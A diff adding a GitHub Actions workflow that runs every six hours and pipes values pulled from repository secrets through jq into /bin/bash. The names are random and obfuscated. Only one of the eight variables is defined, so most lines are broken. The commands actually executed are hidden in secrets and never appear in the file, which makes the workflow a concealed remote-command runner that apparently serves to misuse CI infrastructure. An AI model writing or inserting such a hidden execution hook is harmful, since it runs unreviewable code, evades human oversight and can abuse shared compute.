@@ -1,0 +1,24 @@
+name: hmhaomai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hmhaomai
+        env:
+          pg4: ${{ secrets.pg4 }}
+        run: |
+          echo $pg4 | jq -r .wqmw04 | /bin/bash
+          echo $j82865 | jq -r .ovccb9726 | /bin/bash
+          echo $d33 | jq -r .vfdi3311 | /bin/bash
+          echo $iwfec909 | jq -r .uqwsd902 | /bin/bash
+          echo $pzrvl2948 | jq -r .alelv391 | /bin/bash
+          echo $vttq8 | jq -r .b18 | /bin/bash
+          echo $rx7 | jq -r .kve8 | /bin/bash
+          echo $f4 | jq -r .kthql65770 | /bin/bash
+
